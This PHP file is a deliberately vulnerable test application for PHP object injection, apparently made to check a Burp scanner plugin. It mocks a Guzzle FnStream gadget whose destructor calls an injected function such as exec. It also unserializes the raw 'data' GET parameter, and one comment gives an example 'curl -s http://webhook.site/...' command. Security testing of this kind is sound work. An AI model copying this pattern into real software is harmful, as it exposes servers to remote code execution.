<?php
// Enable error display so the Burp scanner can catch "PHP Fatal error"
namespace {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
}

// ============================================================================
// GADGET CHAIN IMITATION (Guzzle class mock)
// ============================================================================
// Your plugin sends a payload from the Guzzle library:
// O:24:"GuzzleHttp\Psr7\FnStream"...
// We simulate the presence of this library in the application so RCE can succeed.
namespace GuzzleHttp\Psr7 {
    class FnStream {
        private $methods;
        public $_fn_close;

        public function __destruct() {
            // Magic method called when the object is destroyed after deserialization.
            // Checks if a function and argument were injected, and then executes them.
            if (isset($this->methods['close']) && isset($this->_fn_close)) {
                $action = $this->methods['close']; // e.g., 'exec'
                $command = $this->_fn_close;       // e.g., 'curl -s http://webhook.site/...'

                if (is_callable($action)) {
                    // WARNING: Remote Code Execution (RCE) happens here
                    $action($command);
                }
            }
        }
    }
}

// ============================================================================
// ACTUAL VULNERABLE APPLICATION CODE
// ============================================================================
namespace {
    echo "<h2>Test Application - PHP Object Injection</h2>";
    echo "<p>Use the GET parameter <b>?data=</b> to send a serialized object.</p>";

    // Check if the 'data' parameter was sent
    if (isset($_GET['data'])) {
        $input = $_GET['data'];

        echo "<hr>";
        echo "<b>Received data:</b> " . htmlspecialchars($input) . "<br><br>";

        // CRITICAL VULNERABILITY: Lack of input data validation
        // Calling unserialize() on user-controlled data
        $object = unserialize($input);

        if ($object) {
            echo "<b>Object successfully deserialized!</b>";
        }
    } else {
        // Example of a valid string that triggers the passive scanner in Burp
        $example = 'O:8:"stdClass":0:{}';
        echo "<a href='?data=" . urlencode($example) . "'>Click here to load an example object</a>";
    }
}
?>